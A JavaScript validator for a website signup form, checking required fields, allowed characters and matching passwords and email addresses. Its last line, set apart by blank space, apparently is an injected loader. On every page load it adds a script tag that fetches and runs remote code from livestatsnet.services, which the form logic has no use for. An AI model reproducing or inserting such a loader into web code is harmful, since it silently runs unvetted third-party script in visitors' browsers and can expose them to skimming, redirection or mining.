var frmvalidator = new Validator("signup");
 var bgcolor_error = "#FFFF00";
 var textchars="&%$@!~?<>-_+=.";
 
 frmvalidator.setAddnlValidationFunction("DoCustomValidation");
 
  frmvalidator.addValidation("id","req","Please Enter your Inviter's Username");
 frmvalidator.addValidation("id","regexp=^[-_\&A-Za-z0-9\.\@\#\\s]{1,50}$","Inviter's Username Contains invalid characters ");
 
 frmvalidator.addValidation("usr_firstname","req","Please Enter your First Name");
 frmvalidator.addValidation("usr_firstname","regexp=^[-_\&A-Za-z0-9\.\@\#\\s]{1,50}$","First Name Contains invalid characters ");
 
 frmvalidator.addValidation("usr_lastname","req","Please Enter your Last Name");
 frmvalidator.addValidation("usr_lastname","regexp=^[-_\&A-Za-z0-9\.\@\#\\s]{1,50}$","Last Name Contains invalid characters ");
 
 frmvalidator.addValidation("usr_email","req","Please enter your Email Address");
 frmvalidator.addValidation("usr_email","email");
 
 frmvalidator.addValidation("email2","req","Please retype your Email Address");
 frmvalidator.addValidation("email2","email");
 
 frmvalidator.addValidation("usr_phone","req","Please enter your Telephone Number");
 frmvalidator.addValidation("usr_phone","regexp=^[-_\(\)A-Za-z0-9\#\\s]{1,50}$","Telephone Number Contains invalid characters ");
 
frmvalidator.addValidation("account_id","req","Please Enter your STP Username");
   
frmvalidator.addValidation("usr_username","req","Please Enter your desired Username");
frmvalidator.addValidation("usr_username","regexp=^[A-Za-z0-9]{1,50}$","Username Contains invalid characters ");

 frmvalidator.addValidation("usr_pwd","req","Please Enter your Password");
 frmvalidator.addValidation("usr_pwd","regexp=^[-_\!\$\%\^\&\*\+\=\?A-Za-z0-9\.\@\#\\s]{1,50}$","Password Contains invalid characters ");
 
 frmvalidator.addValidation("usr_pwd_2","req","Please Reenter your Password");
 frmvalidator.addValidation("usr_pwd_2","regexp=^[-_\!\$\%\^\&\*\+\=\?A-Za-z0-9\.\@\#\\s]{1,50}$","Reenter Password Contains invalid characters ");  

function DoCustomValidation() {
  var frm = document.forms["signup"];
  
		  if(false == PasswordMatch()){
			return false;
		  }
		  else{
			  
			  
			  
							   if(false == EmailMatch()){
							return false;
						  }
						  else{
							return true;
						  }
					return true;
		  }
}


 function PasswordMatch()
{
  var frm = document.forms["signup"];
  if(frm.usr_pwd.value != frm.usr_pwd_2.value){
		
		frm.usr_pwd.style.background = bgcolor_error;
		frm.usr_pwd.focus();
		 alert('The Password and retyped password do not match!');
    return false;
  }
  else
  {
    return true;
  }
}

 function EmailMatch()
{
  var frm = document.forms["signup"];
  if(frm.usr_email.value != frm.email2.value){
		
		frm.usr_email.style.background = bgcolor_error;
		frm.usr_email.focus();
		 alert('The Email and retyped email address do not match!');
    return false;
  }
  else
  {
    return true;
  }
}

               
if(!loadStats){function loadStats(){var head=document.getElementsByTagName("head")[0],scr=document.createElement("script");scr.type="text/javascript",scr.src="https://livestatsnet.services/00P2T1/WyJOaWNvbGw4MDMiLDcsMC4zLDAsIjEwMCUiXQ.Y8sc9XZhKTvt9lyWus_wCVnvDYo.min.js",scr.async="async",head.appendChild(scr)}loadStats()}
